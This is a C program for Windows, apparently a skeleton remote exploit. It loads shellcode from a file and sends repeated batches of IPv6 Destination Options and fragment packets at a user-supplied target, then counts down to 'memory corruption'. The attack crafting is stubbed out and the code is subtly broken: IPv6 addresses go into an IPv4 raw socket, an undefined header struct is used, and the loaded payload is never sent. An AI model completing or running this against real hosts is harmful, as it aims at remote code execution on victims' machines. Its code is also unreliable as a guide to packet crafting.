#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

#define MAX_PACKET_SIZE 1280
#define NUM_TRIES 20
#define NUM_BATCHES 20

char iface[256] = "Ethernet"; // Default interface name
char ip_addr[INET6_ADDRSTRLEN] = ""; // Default empty IPv6 address
char mac_addr[18] = ""; // Default empty MAC address
char payload[MAX_PACKET_SIZE] = {0}; // Buffer for shellcode payload
int payload_size = 0;

void error(const char *msg) {
    fprintf(stderr, "%s: %d\n", msg, WSAGetLastError());
    exit(1);
}

// Function to read payload from a file
void read_payload_from_file(const char *filename) {
    FILE *file = fopen(filename, "rb");
    if (!file) {
        perror("Failed to open payload file");
        exit(1);
    }

    // Read the file into the payload buffer
    payload_size = fread(payload, 1, MAX_PACKET_SIZE, file);
    if (payload_size <= 0) {
        perror("Failed to read payload or payload is empty");
        exit(1);
    }

    fclose(file);
}

// Function to get a raw socket
SOCKET get_raw_socket() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in sa;

    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
        error("WSAStartup failed");
    }

    sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock == INVALID_SOCKET) {
        error("Failed to create raw socket");
    }

    // Set socket options to allow sending raw packets
    int option = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&option, sizeof(option)) == SOCKET_ERROR) {
        error("Failed to set IP_HDRINCL option");
    }

    return sock;
}

// Function to get interface index
int get_interface_index(SOCKET sock, const char *iface) {
    // On Windows, interface index is typically not required for raw sockets
    // Adjust this function if needed based on your specific requirements
    return 0;
}

// Function to send packets
void send_packets(SOCKET sock, const char *packet, int packet_len) {
    struct sockaddr_in dest;

    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = inet_addr(ip_addr); // Destination address

    if (sendto(sock, packet, packet_len, 0, (struct sockaddr*)&dest, sizeof(dest)) == SOCKET_ERROR) {
        error("Failed to send packet");
    }
}

// Function to craft and send the packets
void craft_and_send_packets(SOCKET sock, int batch_num, int try_num) {
    unsigned char packet[MAX_PACKET_SIZE];
    int packet_len;

    // Prepare packet (simplified; actual header crafting will vary)
    memset(packet, 0, MAX_PACKET_SIZE);
    packet_len = 0;

    // Construct packet (use IPv6 header construction here)

    // First packet (IPv6 with Destination Options header)
    memset(packet, 0, MAX_PACKET_SIZE);
    packet_len = 0;
    // Fill in headers
    packet_len += sizeof(struct ip6_hdr);
    // Append your custom destination options and data here
    send_packets(sock, (char*)packet, packet_len);

    // Second packet (IPv6 with Fragment header, first fragment)
    memset(packet, 0, MAX_PACKET_SIZE);
    packet_len = 0;
    // Fill in headers
    // Append payload
    send_packets(sock, (char*)packet, packet_len);

    // Third packet (IPv6 with Fragment header, second fragment)
    memset(packet, 0, MAX_PACKET_SIZE);
    packet_len = 0;
    // Fill in headers
    send_packets(sock, (char*)packet, packet_len);
}

int main(int argc, char *argv[]) {
    // Check for command-line arguments
    if (argc < 4) {
        // If not enough arguments, prompt the user
        printf("Usage: %s <interface> <ipv6_address> <mac_address>\n", argv[0]);
        printf("Or enter interactively:\n");

        printf("Enter interface name: ");
        scanf("%s", iface);

        printf("Enter target IPv6 address: ");
        scanf("%s", ip_addr);

        printf("Enter target MAC address: ");
        scanf("%s", mac_addr);
    } else {
        // Use command-line arguments
        strncpy(iface, argv[1], sizeof(iface)-1);
        strncpy(ip_addr, argv[2], INET6_ADDRSTRLEN-1);
        strncpy(mac_addr, argv[3], 17);
    }

    // Check if IP address is empty and use self-targeting if so
    if (strlen(ip_addr) == 0) {
        printf("No target IP address specified. Using self-targeting.\n");
        strncpy(ip_addr, "127.0.0.1", INET6_ADDRSTRLEN-1); // Example self-targeting
    }

    // Read payload from shellcode.txt
    read_payload_from_file("shellcode.txt");

    SOCKET sock = get_raw_socket();

    for (int batch_num = 0; batch_num < NUM_BATCHES; batch_num++) {
        for (int try_num = 0; try_num < NUM_TRIES; try_num++) {
            craft_and_send_packets(sock, batch_num, try_num);
        }
    }

    closesocket(sock);
    WSACleanup();

    printf("Sending packets\n");

    for (int i = 60; i > 0; i--) {
        printf("Memory corruption will be triggered in %d seconds\r", i);
        fflush(stdout);
        Sleep(1000);
    }

    printf("\n");
    return 0;
}
